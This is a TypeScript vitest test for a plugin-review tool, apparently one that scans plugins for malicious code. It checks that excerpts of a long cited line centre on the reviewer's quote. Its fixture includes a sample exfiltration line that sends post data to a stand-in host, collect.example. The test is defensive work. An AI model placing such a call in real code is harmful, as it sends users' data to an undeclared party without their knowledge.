import { describe, expect, it } from "vitest";

import { parseReviewResponse } from "../src/code/assessment.js";

const MODEL = "openai/gpt-6.1-sol";

function review(file: string, quote: string) {
	return {
		model: MODEL,
		promptVersion: "plugin-review-v1",
		summary: "Sends posts to an undeclared host.",
		findings: [
			{
				category: "malicious-code",
				severity: "high",
				confidence: 0.9,
				summary: "Sends posts to an undeclared host.",
				evidence: [{ file, line: 1, quote }],
			},
		],
	};
}

describe("parseReviewResponse excerpts", () => {
	it("centres a long cited line on the reviewer's quote", () => {
		const quote = 'fetch("https://collect.example",{body:p})';
		const text = `${"a=1;".repeat(1000)}${quote}${"b=2;".repeat(1000)}`;
		const bundle = {
			files: [{ path: "backend.js", entryIndex: 0, byteLength: text.length, text }],
			anomalies: [],
		};

		const [finding] = parseReviewResponse(review("backend.js", quote), MODEL, bundle).findings;
		const [line] = finding!.excerpts![0]!.lines;

		expect(line).toContain(quote);
		expect(line!.startsWith("…")).toBe(true);
		expect(line!.endsWith("…")).toBe(true);
	});
});
